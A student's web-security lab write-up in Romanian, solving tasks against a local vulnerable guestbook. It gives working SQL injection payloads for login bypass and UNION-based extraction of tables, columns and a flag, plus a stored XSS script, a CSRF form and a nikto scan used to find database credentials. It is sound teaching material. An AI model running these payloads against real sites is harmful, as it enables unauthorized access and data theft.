# Laborator 8 - Web Security
## Cerinta 1
serverul ruleaza direct un query-ul urmator SQL cu stringurile date la login:
```sql
SELECT * FROM tabela WHERE username=<user> AND PASSWORD=<passwd> LIMIT 	1
```

Ca regula sa dea match pe `username` ii dau un string care se evalueaza la
`true`: `' or 1-- `. `--` fac ca restul comenzii, pana la `'` sa fie comentat.
E nevoie si de o parola astfel incat query-ul sa fie corect sintactic. poate fi
orice, sau chiar nimic.


## Cerinta 2
Mega jegoasa ca e neoie de destul de mult *SQL*. Boikea pls...

1. In primul rand, trebuie sa vedem cate coloane intoarce query-ul de mai sus.
Pentru asta, incercam sa ordonam rezultatul interogarii in functie de fiecare
coloana, pana crapa. Incercand sa ne logam cu
`' or 1 order by 1,2,3,4,5,6,7,8,9,10-- ` vedem ca interogarea crapa la coloana
5. Asadar, sunt 4 coloane.

2. Acum trebuie sa gasim tabelele din schema `guestbook`. Pentru asta, ne logam
cu:
```
' union select 1, 2, 3, group_concat(table_name separator ',') from information_schema.tables where table_schema='guestbook' --
```
Observam ca tabelele din baza de date sunt `entries`, `flags` si `users`. Cel
mai probabil cea care ne intereseaza este `flags`.

3. In mod similar, avem nevoie sa stim care e coloana cu flagul propriu-zis.
Mai intai aflam numele tuturor coloanelor din tabela `falgs` astfel:
```
' union select 1, 2, 3, group_concat(column_name separator ',') from information_schema.columns where table_schema='guestbook' and table_name='flags' --
```
Numele coloanelor sunt `id`, `name` si `flag`. Probabil flagul se afla in
coloana `flag`.

4. Acum doar selectam flagul din tabela astfel:
```
' union select 1, 2, 3, flag from guestbook.flags --
```
si obtinem flagul: `SpeishFlag{th1sw4sSQL1nj3cti0n}`.


## Cerinta 3
Orice mesaj scris in chenarul din server e interpretat ca *HTML*. Din motivul
asta, orice script e bagat in *HTML*-ul ala e si executat. Asadar, mesajul
contine:
```html
<script>
alert("Manele!");
</script> 
```
si genereaza un "dialog box" in care scrie "Manele!"


## Cerinta 4
Am gasit urmatorul `form` in codul *HTML* al guestbookului:
```html
<form method="post" action="/guestbook/post">
  <p>
    <div><label for="message">Message:</label></div>
    <textarea id="message" name="message" rows="3" cols="80"></textarea>
  </p>
  <p>
    <input type="submit" value="Send">
  </p>
</form>
```
Eu l-am copiat local si l-am modificat astfel incat apasand pe butonul
"Click aicea" sa se posteze prin *POST* mesajul "Manele 2022!" pe guestbook:
```html
<form method="post" action="http://localhost:8080/guestbook/post">
  <p>
    <label>Boss:</label>
    <input type="hidden" id="message" name="message" value="Manele 2022">
  </p>
  <p>
    <input type="submit" value="Click aicea">
  </p>
</form>
```


## Cerinta 5
Trebuie gasit fisierul *JavaScript* cu care ruleaza site-ul si cautate in el
credentialele pentru conectarea la *MySQL*. Pentru asta, am folosesit utilitarul
`nikto`, care scaneaza serverul si gaseste fisierul `server.js`, care poate fi
obtinut printr-un `curl` si pe care l-am adaugat si in arhiva.
